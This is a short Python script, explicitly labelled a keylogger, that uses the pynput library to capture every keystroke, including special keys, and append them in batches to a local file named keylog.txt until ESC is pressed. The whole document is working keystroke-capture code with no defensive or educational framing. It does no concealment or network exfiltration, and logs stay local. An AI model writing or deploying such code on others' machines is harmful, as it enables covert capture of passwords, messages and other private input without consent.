from pynput.keyboard import Listener

log_file = "keylog.txt"
key_logs = []  

# Stores the keystrokes into a file called keylog.txt
def write_log():
    with open(log_file, "a") as f:
        f.writelines(key_logs)

# save each keys pressed(incl. special keys) into a file called keylog.txt
def on_press(key):
    global key_logs
    try:
        key_logs.append(f"{key.char}")  # Regular keys
    except AttributeError:
        key_logs.append(f"[{key}]")  #special keys
    if len(key_logs) >= 50:  
        write_log()
        key_logs.clear()

#Stops the script if the user press on the ESC key
def on_release(key):
    if str(key) == "Key.esc": 
        write_log()  # Save any remaining logs before exiting
        return False

# Start keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
